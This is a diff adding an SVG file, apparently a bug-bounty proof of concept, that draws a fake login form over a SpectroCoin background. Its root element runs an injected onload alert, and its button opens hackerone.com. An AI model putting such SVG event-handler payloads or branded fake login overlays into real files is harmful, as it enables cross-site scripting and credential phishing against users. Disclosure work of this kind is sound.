@@ -1,0 +1,69 @@
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('Injected!')" width="100%" height="100%" viewBox="0 0 1920 1080" style="font-family: Arial, sans-serif;">
+  <style>
+    .background {
+      fill: none;
+    }
+    .container {
+      fill: rgba(255, 255, 255, 0.85); /* Slight transparency for a cleaner overlay */
+      stroke: #ccc;
+      stroke-width: 1;
+      rx: 10;
+      ry: 10;
+    }
+    .title {
+      fill: #ffffff;
+      font-size: 48px;
+      font-weight: bold;
+    }
+    .label {
+      fill: #ffffff;
+      font-size: 24px;
+      font-weight: bold;
+    }
+    .input-box {
+      fill: #ffffff;
+      stroke: #aaa;
+      stroke-width: 2;
+      rx: 10;
+      ry: 10;
+    }
+    .login-button {
+      fill: #007bff;
+      cursor: pointer;
+      rx: 10;
+      ry: 10;
+    }
+    .login-button:hover {
+      fill: #0056b3;
+    }
+    .button-text {
+      fill: #ffffff;
+      font-size: 24px;
+      font-weight: bold;
+      pointer-events: none;
+    }
+  </style>
+  
+  <!-- Background Image -->
+  <image href="https://spectrocoin.com/og/sc-og-fb.png" width="100%" height="100%" class="background" />
+
+  <!-- Form Container -->
+  <rect x="560" y="240" width="800" height="600" class="container" />
+
+  <!-- Title -->
+  <text x="960" y="320" class="title" text-anchor="middle">Login</text>
+
+  <!-- Username label -->
+  <text x="600" y="440" class="label">Username:</text>
+  <!-- Username input box -->
+  <rect x="760" y="400" width="600" height="60" class="input-box" />
+
+  <!-- Password label -->
+  <text x="600" y="540" class="label">Password:</text>
+  <!-- Password input box -->
+  <rect x="760" y="500" width="600" height="60" class="input-box" />
+
+  <!-- Login button -->
+  <rect x="860" y="640" width="400" height="80" class="login-button" onclick="window.open('https://www.hackerone.com', '_blank')" />
+  <text x="1060" y="690" class="button-text" text-anchor="middle">Login</text>
+</svg>
